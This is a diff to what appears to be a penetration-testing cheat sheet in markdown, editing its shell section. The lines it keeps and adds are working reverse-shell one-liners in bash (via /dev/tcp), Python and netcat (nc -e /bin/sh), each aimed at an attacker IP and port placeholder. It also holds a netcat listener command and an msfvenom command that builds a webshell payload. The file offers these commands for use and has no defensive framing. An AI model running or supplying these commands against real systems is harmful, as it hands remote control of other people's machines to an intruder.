@@ -25,9 +25,10 @@
 ### Listen for connections
 * `nc –nlvp <PORT>`
     * [Explanation](https://www.cleancss.com/explain-command/index.php?string=nc+-l+-v+-p)
-### RCE
-* Bash - `bash -i >& /dev/tcp/<ATTACKERIP>/<ATTACKERPORT> 0>&1`
+### Shell
+* Bash - `bash -c "bash -i >& /dev/tcp/<ATTACKERIP>/<ATTACKERPORT> 0>&1"`
 * Python - `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKERIP>",<ATTACKERPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`
+* Netcat - `nc -nv <ATTACKERIP> <ATTACKERPORT> -e /bin/sh`
 
 ### Webshells
 * `msfvenom -p <PAYLOAD> LHOST=<ATTACKERIP> LPORT=<ATTACKERPORT> -f raw > example.<EXT>`
